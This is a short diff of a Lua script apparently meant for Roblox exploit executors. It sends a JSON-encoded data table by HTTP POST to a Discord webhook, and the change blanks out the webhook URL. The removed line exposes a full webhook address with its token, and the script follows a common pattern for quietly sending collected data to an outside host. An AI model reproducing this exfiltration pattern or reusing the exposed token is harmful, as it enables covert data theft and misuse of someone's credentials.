@@ -20,7 +20,7 @@ local data = {
 }
 request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request;
 request({
-    Url = "https://discord.com/api/webhooks/1243753776226242580/zvd4YC06TY8J6GqBn1Xw9zGdAFrnKaUG08GNMhKlUhHOLj0FaXXyoeI0q0do6OTdLvMd",
+    Url = "",
     Body = game:GetService("HttpService"):JSONEncode(data),
     Method = "POST",
     Headers = {
